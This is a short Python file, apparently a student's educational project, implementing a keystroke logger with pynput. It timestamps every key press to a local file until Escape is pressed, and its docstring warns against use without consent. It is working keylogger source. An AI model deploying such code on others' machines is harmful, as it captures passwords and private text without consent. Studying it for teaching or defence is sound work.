from pynput import keyboard
from datetime import datetime, date, time

"""
This is a simple keystoke logger made by Lauren Hruza.
When you run this file it will start recording every key
you press until the escape button is pressed.
The program writes the key pressed and the time at which it was pressed
into a file that follows the format: "year-month-day-hour-minute-second.txt" for you to see.

Reminder it is not ethical to use this program on a computer 
unless the owner consents to it, this is purely for educational
purposes. :)
"""

#get the current time and date
now = datetime.now()
#format it for our file name
now_str = now.strftime("%Y-%m-%d-%H-%M-%S")

#create a new file with that name and with write perms
file = open(now_str, "w")

#define the function that will run on every key press
def on_press(key):
    #try catch statement for better error analysis (minimal)
    try:
        #get the time and key data then write it to the file
        time = str(datetime.now())
        file.write(f"[{time}]: {key}\n")
        #flush immediately so all data is saved
        file.flush()
        
        #how to close the file and shut down the program
        if key == keyboard.Key.esc:
            file.close()
            return False

    except Exception as e:
        print(f"Error: {e}")

#create a keyboard listener that uses the function above to record
#the key strokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
